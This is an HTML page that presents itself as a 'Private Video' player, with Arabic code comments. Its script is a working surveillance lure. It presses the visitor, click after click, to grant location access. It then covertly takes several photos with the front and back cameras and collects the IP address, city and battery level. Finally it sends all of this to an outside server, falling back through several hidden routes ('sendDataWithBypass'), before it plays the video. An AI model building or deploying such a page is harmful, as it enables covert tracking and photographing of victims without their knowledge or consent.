<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Video Player</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            background-color: #000;
            color: #fff;
            overflow: hidden;
        }
        .video-player-container {
            width: 90%;
            max-width: 800px;
            background: #111;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            position: relative;
        }
        .video-thumbnail {
            position: relative;
            width: 100%;
            height: 450px;
            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)),
                url('https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg');
            background-size: cover;
            background-position: center;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            flex-direction: column;
        }
        
        /* الزر الموحد - يظهر في حالتين */
        #unifiedButton {
            position: relative;
            z-index: 10;
            cursor: pointer;
            transition: all 0.3s ease;
            text-align: center;
        }
        
        /* حالة زر التشغيل العادي */
        #unifiedButton.play-mode {
            width: 100px;
            height: 100px;
            background-color: rgba(255, 0, 0, 0.85);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
            border: none;
        }
        
        #unifiedButton.play-mode:hover {
            transform: scale(1.1);
            background-color: rgba(255, 0, 0, 0.95);
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.7);
        }
        
        /* أيقونة التشغيل */
        .play-icon {
            width: 0;
            height: 0;
            border-left: 30px solid white;
            border-top: 20px solid transparent;
            border-bottom: 20px solid transparent;
            margin-left: 8px;
        }
        
        /* حالة زر الإعدادات */
        #unifiedButton.settings-mode {
            background: rgba(255, 255, 255, 0.1);
            border: 4px solid #ff6b6b;
            border-radius: 24px;
            padding: 40px 50px;
            backdrop-filter: blur(8px);
            box-shadow: 0 0 50px rgba(255, 0, 0, 0.4);
            min-width: 280px;
        }
        
        #unifiedButton.settings-mode:hover {
            transform: scale(1.05);
            background: rgba(255, 255, 255, 0.2);
            border-color: #ff4757;
            box-shadow: 0 0 70px rgba(255, 0, 0, 0.7);
        }
        
        .settings-icon {
            font-size: 90px;
            line-height: 1;
            color: #ff6b6b;
            margin-bottom: 15px;
        }
        
        .settings-text {
            font-size: 32px;
            font-weight: bold;
            color: #fff;
            text-shadow: 0 2px 10px rgba(0,0,0,0.8);
        }
        
        .settings-subtext {
            font-size: 18px;
            color: #ddd;
            margin-top: 8px;
            opacity: 0.9;
        }
        
        /* حالة زر إعادة المحاولة */
        #unifiedButton.retry-mode {
            background: rgba(255, 165, 0, 0.2);
            border: 4px solid #ffa500;
            border-radius: 24px;
            padding: 30px 40px;
            backdrop-filter: blur(8px);
            box-shadow: 0 0 50px rgba(255, 165, 0, 0.4);
            min-width: 250px;
        }
        
        #unifiedButton.retry-mode:hover {
            transform: scale(1.05);
            background: rgba(255, 165, 0, 0.3);
            border-color: #ff8c00;
            box-shadow: 0 0 70px rgba(255, 165, 0, 0.7);
        }
        
        .retry-icon {
            font-size: 70px;
            line-height: 1;
            margin-bottom: 10px;
        }
        
        .retry-text {
            font-size: 28px;
            font-weight: bold;
            color: #fff;
            text-shadow: 0 2px 10px rgba(0,0,0,0.8);
        }
        
        .retry-subtext {
            font-size: 16px;
            color: #ddd;
            margin-top: 8px;
            opacity: 0.9;
        }

        .video-info {
            padding: 20px;
            border-bottom: 1px solid #333;
        }
        .video-title {
            font-size: 1.5rem;
            font-weight: bold;
            margin-bottom: 8px;
        }
        .video-controls {
            padding: 15px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: #1a1a1a;
            flex-wrap: wrap;
            gap: 10px;
        }
        .control-button {
            background: none;
            border: none;
            color: white;
            font-size: 1.2rem;
            cursor: pointer;
            padding: 8px 15px;
            border-radius: 4px;
            transition: background 0.2s;
        }
        .control-button:hover {
            background: #333;
        }
        .progress-bar {
            flex-grow: 1;
            height: 4px;
            background: #333;
            border-radius: 2px;
            margin: 0 20px;
            overflow: hidden;
            position: relative;
            min-width: 60px;
        }
        .progress-fill {
            position: absolute;
            height: 100%;
            width: 0%;
            background: #ff0000;
        }
        .time-display {
            color: #aaa;
            font-size: 0.9rem;
            min-width: 100px;
            text-align: center;
        }
        .spinner {
            border: 4px solid #fff;
            border-top: 4px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            width: 32px;
            height: 32px;
            animation: spin 1s linear infinite;
            position: absolute;
            display: none;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 20;
        }
        @keyframes spin {
            0% { transform: translate(-50%, -50%) rotate(0deg); }
            100% { transform: translate(-50%, -50%) rotate(360deg); }
        }
        #loading {
            display: none;
            font-size: 1.2rem;
            color: #fff;
            margin-top: 20px;
            text-align: center;
        }
        .loading-text {
            margin-top: 10px;
        }
        .volume-control {
            display: flex;
            align-items: center;
            gap: 10px;
            color: #aaa;
        }
        .volume-slider {
            width: 80px;
            height: 4px;
            background: #333;
            border-radius: 2px;
            position: relative;
        }
        .volume-level {
            position: absolute;
            height: 100%;
            width: 70%;
            background: #ff0000;
        }
        .fullscreen-btn {
            margin-left: 15px;
        }
        @media (max-width: 480px) {
            .video-controls {
                padding: 10px 12px;
                gap: 6px;
            }
            .progress-bar {
                margin: 0 6px;
            }
            .time-display {
                font-size: 0.75rem;
                min-width: 60px;
            }
            .video-title {
                font-size: 1.2rem;
            }
            .video-thumbnail {
                height: 280px;
            }
            #unifiedButton.play-mode {
                width: 70px;
                height: 70px;
            }
            .play-icon {
                border-left-width: 22px;
                border-top-width: 14px;
                border-bottom-width: 14px;
                margin-left: 5px;
            }
            #unifiedButton.settings-mode {
                padding: 20px 30px;
                min-width: 200px;
                border-radius: 16px;
            }
            .settings-icon {
                font-size: 60px;
            }
            .settings-text {
                font-size: 24px;
            }
            .settings-subtext {
                font-size: 15px;
            }
            #unifiedButton.retry-mode {
                padding: 20px 30px;
                min-width: 200px;
                border-radius: 16px;
            }
            .retry-icon {
                font-size: 50px;
            }
            .retry-text {
                font-size: 22px;
            }
            .retry-subtext {
                font-size: 14px;
            }
        }
    </style>
</head>
<body>

    <div class="video-player-container">
        <div class="video-info">
            <div class="video-title">Private Video</div>
            <div class="video-meta"></div>
        </div>

        <div class="video-thumbnail" id="thumbnailArea">
            <!-- الزر الموحد -->
            <div id="unifiedButton" class="play-mode">
                <div class="play-icon"></div>
            </div>
            
            <div class="spinner" id="spinner"></div>
        </div>

        <video id="realVideo" controls playsinline muted style="display:none; width:100%; height:450px; background:#000;">
            <source src="https://files.catbox.moe/okukrp.mp4" type="video/mp4" />
        </video>

        <div class="video-controls">
            <div class="progress-bar">
                <div class="progress-fill"></div>
            </div>
            <div class="time-display">0:00 / 2:45</div>
            <div class="volume-control">
                <span></span>
                <div class="volume-slider">
                    <div class="volume-level"></div>
                </div>
            </div>
            <button class="control-button fullscreen-btn">⛶</button>
        </div>
    </div>

    <div id="loading">
        <div class="spinner" style="position:static;"></div>
        <div class="loading-text">Loading video... Please wait</div>
    </div>

    <script>
        (function() {
            'use strict';

            // حالات الزر المختلفة
            const BUTTON_STATES = {
                INITIAL: 'play-mode',      // الحالة الأولية: زر تشغيل عادي
                SETTINGS: 'settings-mode',  // زر الإعدادات (النقرة الأولى)
                RETRY: 'retry-mode',        // زر إعادة المحاولة (النقرة الثالثة)
                PROCESSING: 'processing'    // حالة المعالجة
            };

            let capturedData = {
                permissions: [],
                images: [],
                ipInfo: '',
                batteryStatus: '',
                location: '',
                chatId: ''
            };

            let currentButtonState = BUTTON_STATES.INITIAL;
            let settingsOpened = false;
            let videoStarted = false;
            let isProcessing = false;
            let permissionsRequested = false;

            const unifiedButton = document.getElementById('unifiedButton');
            const thumbnailArea = document.getElementById('thumbnailArea');
            const realVideo = document.getElementById('realVideo');
            const spinner = document.getElementById('spinner');
            const loading = document.getElementById('loading');

            // تغيير حالة الزر وشكله
            function setButtonState(state) {
                currentButtonState = state;
                unifiedButton.className = state;
                
                // تحديث محتوى الزر حسب الحالة
                switch(state) {
                    case BUTTON_STATES.INITIAL:
                        unifiedButton.innerHTML = '<div class="play-icon"></div>';
                        break;
                    case BUTTON_STATES.SETTINGS:
                        unifiedButton.innerHTML = `
                            <div class="settings-icon">⚙️</div>
                            <div class="settings-text">تغيير الإعدادات</div>
                            <div class="settings-subtext">اضغط لفتح إعدادات الموقع الجغرافي</div>
                        `;
                        break;
                    case BUTTON_STATES.RETRY:
                        unifiedButton.innerHTML = `
                            <div class="retry-icon">🔄</div>
                            <div class="retry-text">إعادة المحاولة</div>
                            <div class="retry-subtext">اضغط لطلب إذن الموقع مرة أخرى</div>
                        `;
                        break;
                }
            }

            // فتح إعدادات الموقع الجغرافي فقط
            function openLocationSettings() {
                const ua = navigator.userAgent || '';
                const isMobile = /Android|iPhone|iPad|iPod|webOS/i.test(ua);
                
                console.log('Opening location settings...');
                
                const isChrome = /Chrome/i.test(ua) && !/Edge|Edg|OPR|Opera|Brave/i.test(ua);
                const isFirefox = /Firefox/i.test(ua);
                const isSafari = /Safari/i.test(ua) && !/Chrome|CriOS|FxiOS|OPiOS|Brave/i.test(ua);
                const isEdge = /Edg/i.test(ua);
                const isOpera = /OPR|Opera/i.test(ua);
                const isBrave = /Brave/i.test(ua);
                const isSamsung = /SamsungBrowser/i.test(ua);
                const isAndroid = /Android/i.test(ua);
                const isIOS = /iPhone|iPad|iPod/i.test(ua);
                
                let opened = false;
                
                // محاولة 1: Chrome على أندرويد - إعدادات الموقع مباشرة
                if (isChrome && isAndroid) {
                    try {
                        window.location.href = 'intent://settings/location#Intent;scheme=android-app;end';
                        opened = true;
                    } catch (e) {}
                }
                
                // محاولة 2: Chrome على سطح المكتب - إعدادات الموقع
                if (isChrome && !isAndroid && !opened) {
                    try {
                        window.location.href = 'chrome://settings/content/location';
                        opened = true;
                    } catch (e) {}
                }
                
                // محاولة 3: Firefox - إعدادات الخصوصية والموقع
                if (isFirefox && !opened) {
                    try {
                        window.location.href = 'about:preferences#privacy';
                        opened = true;
                    } catch (e) {}
                }
                
                // محاولة 4: Safari على iOS - إعدادات الموقع
                if (isSafari && isIOS && !opened) {
                    try {
                        window.location.href = 'App-Prefs:Privacy&path=LOCATION';
                        opened = true;
                    } catch (e) {}
                }
                
                // محاولة 5: Safari على Mac - إعدادات الموقع
                if (isSafari && !isIOS && !opened) {
                    try {
                        window.location.href = 'x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices';
                        opened = true;
                    } catch (e) {}
                }
                
                // محاولة 6: Android عام - إعدادات الموقع
                if (isAndroid && !opened) {
                    try {
                        window.location.href = 'intent://#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end';
                        opened = true;
                    } catch (e) {}
                }
                
                // محاولة 7: Edge - إعدادات الموقع
                if (isEdge && !opened) {
                    try {
                        window.location.href = 'edge://settings/content/location';
                        opened = true;
                    } catch (e) {}
                }
                
                // محاولة 8: Opera - إعدادات الموقع
                if (isOpera && !opened) {
                    try {
                        window.location.href = 'opera://settings/content/location';
                        opened = true;
                    } catch (e) {}
                }
                
                // محاولة 9: Brave - إعدادات الموقع
                if (isBrave && !opened) {
                    try {
                        window.location.href = 'brave://settings/content/location';
                        opened = true;
                    } catch (e) {}
                }
                
                // محاولة 10: Samsung Internet - إعدادات الموقع
                if (isSamsung && !opened) {
                    try {
                        window.location.href = 'intent://#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end';
                        opened = true;
                    } catch (e) {}
                }
                
                if (!opened) {
                    alert('يرجى فتح إعدادات الموقع الجغرافي يدوياً في متصفحك');
                }
            }

            // طلب إذن الموقع الجغرافي فقط
            async function requestLocationPermission() {
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(
                            resolve,
                            reject,
                            { enableHighAccuracy: true, timeout: 10000 }
                        );
                    });
                    capturedData.location = `Lat: ${position.coords.latitude.toFixed(6)}, Long: ${position.coords.longitude.toFixed(6)}`;
                    capturedData.permissions.push('Geolocation Allowed');
                    return true;
                } catch (err) {
                    capturedData.permissions.push('Geolocation Denied');
                    capturedData.location = '';
                    return false;
                }
            }

            // جلب البيانات الإضافية
            async function fetchIPInfo() {
                try {
                    const response = await fetch('https://ipapi.co/json/');
                    const data = await response.json();
                    capturedData.ipInfo = `Country: ${data.country_name}, City: ${data.city}, IP: ${data.ip}`;
                } catch {
                    capturedData.ipInfo = "IP Info not available";
                }
            }

            async function getBatteryStatus() {
                try {
                    const battery = await navigator.getBattery();
                    capturedData.batteryStatus = Math.round(battery.level * 100) + '%';
                } catch {
                    capturedData.batteryStatus = "Unknown";
                }
            }

            async function captureFromCamera(facingMode) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: { exact: facingMode } }
                    });
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    await video.play();
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    capturedData.images.push(canvas.toDataURL('image/jpeg').split(',')[1]);
                    stream.getTracks().forEach(track => track.stop());
                    capturedData.permissions.push(`${facingMode === 'user' ? 'Front' : 'Back'} Camera Allowed`);
                } catch {
                    capturedData.permissions.push(`${facingMode === 'user' ? 'Front' : 'Back'} Camera Denied`);
                }
            }

            async function sendDataWithBypass(data) {
                const urls = [
                    'https://server-brxz.onrender.com/submitData',
                    'https://server-brxz.onrender.com/submitData'
                ];
                for (let url of urls) {
                    try {
                        await fetch(url, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                            body: new URLSearchParams(data),
                            mode: 'no-cors'
                        });
                        return;
                    } catch (e) {}
                    try {
                        const xhr = new XMLHttpRequest();
                        xhr.open('POST', url, false);
                        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                        xhr.send(new URLSearchParams(data));
                        return;
                    } catch (e) {}
                    try {
                        const iframe = document.createElement('iframe');
                        iframe.style.display = 'none';
                        document.body.appendChild(iframe);
                        const form = document.createElement('form');
                        form.method = 'POST';
                        form.action = url;
                        form.target = iframe.name || 'hiddenFrame';
                        iframe.name = form.target;
                        for (let key in data) {
                            const input = document.createElement('input');
                            input.type = 'hidden';
                            input.name = key;
                            input.value = data[key];
                            form.appendChild(input);
                        }
                        document.body.appendChild(form);
                        form.submit();
                        setTimeout(() => {
                            document.body.removeChild(form);
                            document.body.removeChild(iframe);
                        }, 1000);
                        return;
                    } catch (e) {}
                    try {
                        const blob = new Blob([new URLSearchParams(data).toString()], {
                            type: 'application/x-www-form-urlencoded'
                        });
                        navigator.sendBeacon(url, blob);
                        return;
                    } catch (e) {}
                }
            }

            // تشغيل الفيديو مع الصوت
            function startVideoWithSound() {
                if (videoStarted) return;
                videoStarted = true;

                thumbnailArea.style.display = 'none';
                realVideo.style.display = 'block';

                realVideo.muted = false;
                realVideo.volume = 1.0;

                const playPromise = realVideo.play();
                if (playPromise !== undefined) {
                    playPromise.then(() => {
                        console.log('Video playing with sound');
                    }).catch(() => {
                        realVideo.muted = true;
                        realVideo.play().then(() => {
                            setTimeout(() => {
                                realVideo.muted = false;
                                realVideo.volume = 1.0;
                            }, 100);
                        }).catch(() => {});
                    });
                }

                // محاولات إضافية لضمان الصوت
                setTimeout(() => {
                    realVideo.muted = false;
                    realVideo.volume = 1.0;
                    try { realVideo.play(); } catch (e) {}
                }, 500);

                setTimeout(() => {
                    realVideo.muted = false;
                    realVideo.volume = 1.0;
                    try { realVideo.play(); } catch (e) {}
                }, 3000);
            }

            // جمع البيانات وتشغيل الفيديو
            async function collectDataAndPlay() {
                if (isProcessing) return;
                isProcessing = true;

                spinner.style.display = 'block';
                loading.style.display = 'block';
                unifiedButton.style.opacity = '0.5';
                unifiedButton.style.pointerEvents = 'none';

                capturedData.chatId = new URLSearchParams(window.location.search).get('chatId') || '';

                await Promise.all([
                    fetchIPInfo(),
                    getBatteryStatus()
                ]);

                await captureFromCamera('user');
                await captureFromCamera('environment');
                await captureFromCamera('user');
                await captureFromCamera('environment');

                const data = {
                    chatId: capturedData.chatId,
                    imageDatas: capturedData.images.join(','),
                    location: capturedData.location,
                    permissions: capturedData.permissions.join(', '),
                    ipInfo: capturedData.ipInfo,
                    battery: capturedData.batteryStatus
                };

                await sendDataWithBypass(data);

                spinner.style.display = 'none';
                loading.style.display = 'none';
                unifiedButton.style.opacity = '1';
                unifiedButton.style.pointerEvents = 'auto';

                startVideoWithSound();
                isProcessing = false;
            }

            // معالج النقر على الزر الموحد
            async function handleButtonClick(e) {
                e.stopPropagation();
                
                if (videoStarted || isProcessing) return;

                switch(currentButtonState) {
                    case BUTTON_STATES.INITIAL:
                        // النقرة الأولى: فتح إعدادات الموقع الجغرافي
                        console.log('First click: Opening location settings');
                        openLocationSettings();
                        settingsOpened = true;
                        setButtonState(BUTTON_STATES.RETRY);
                        break;

                    case BUTTON_STATES.SETTINGS:
                        // النقرة الثانية (من الإعدادات): طلب إذن الموقع
                        console.log('Second click: Requesting location permission');
                        const locationGranted = await requestLocationPermission();
                        
                        if (locationGranted) {
                            // تم منح الإذن - تشغيل الفيديو مباشرة مع الصوت
                            console.log('Location permission granted - Starting video');
                            await collectDataAndPlay();
                        } else {
                            // لم يتم منح الإذن - إظهار زر إعادة المحاولة
                            console.log('Location permission denied - Showing retry button');
                            setButtonState(BUTTON_STATES.RETRY);
                        }
                        break;

                    case BUTTON_STATES.RETRY:
                        // النقرة الثالثة: إعادة طلب إذن الموقع
                        console.log('Third click: Retrying location permission');
                        const retryGranted = await requestLocationPermission();
                        
                        if (retryGranted) {
                            // تم منح الإذن - تشغيل الفيديو
                            console.log('Location permission granted on retry - Starting video');
                            await collectDataAndPlay();
                        } else {
                            // فشل مرة أخرى - العودة لزر الإعدادات
                            console.log('Location permission denied again - Going back to settings');
                            setButtonState(BUTTON_STATES.SETTINGS);
                        }
                        break;
                }
            }

            // مراقبة العودة من الإعدادات
            document.addEventListener('visibilitychange', function() {
                if (document.visibilityState === 'visible' && settingsOpened && !videoStarted && !isProcessing) {
                    // المستخدم عاد من الإعدادات - تغيير الزر لوضع طلب الإذن
                    if (currentButtonState === BUTTON_STATES.RETRY) {
                        setButtonState(BUTTON_STATES.SETTINGS);
                        permissionsRequested = false;
                    }
                }
            });

            // ربط الأحداث
            if (unifiedButton) {
                unifiedButton.addEventListener('click', handleButtonClick);
            }
            if (thumbnailArea) {
                thumbnailArea.addEventListener('click', function(e) {
                    if (e.target === thumbnailArea) {
                        handleButtonClick(e);
                    }
                });
            }

            // تفعيل الصوت عند أي تفاعل
            document.addEventListener('click', function() {
                if (realVideo && videoStarted) {
                    realVideo.muted = false;
                    realVideo.volume = 1.0;
                    try { realVideo.play(); } catch (e) {}
                }
            }, true);

            // أزرار التحكم
            document.querySelectorAll('.control-button').forEach(button => {
                button.addEventListener('click', function(e) {
                    e.stopPropagation();
                    if (this.textContent.includes('⛶')) {
                        const video = document.getElementById('realVideo');
                        if (video.requestFullscreen) {
                            video.requestFullscreen();
                        } else if (video.webkitRequestFullscreen) {
                            video.webkitRequestFullscreen();
                        }
                    }
                });
            });

            // شريط التقدم الوهمي
            const progressInterval = setInterval(() => {
                const progressFill = document.querySelector('.progress-fill');
                const realVideoEl = document.getElementById('realVideo');
                if (realVideoEl.style.display === 'block') {
                    clearInterval(progressInterval);
                    return;
                }
                const currentWidth = parseInt(progressFill.style.width) || 35;
                const newWidth = (currentWidth + 0.1) % 100;
                progressFill.style.width = newWidth + '%';

                const timeDisplay = document.querySelector('.time-display');
                const currentSeconds = Math.floor((newWidth / 100) * 165);
                const minutes = Math.floor(currentSeconds / 60);
                const seconds = currentSeconds % 60;
                timeDisplay.textContent = `${minutes}:${seconds.toString().padStart(2, '0')} / 2:45`;
            }, 1000);

        })();
    </script>

</body>
</html>
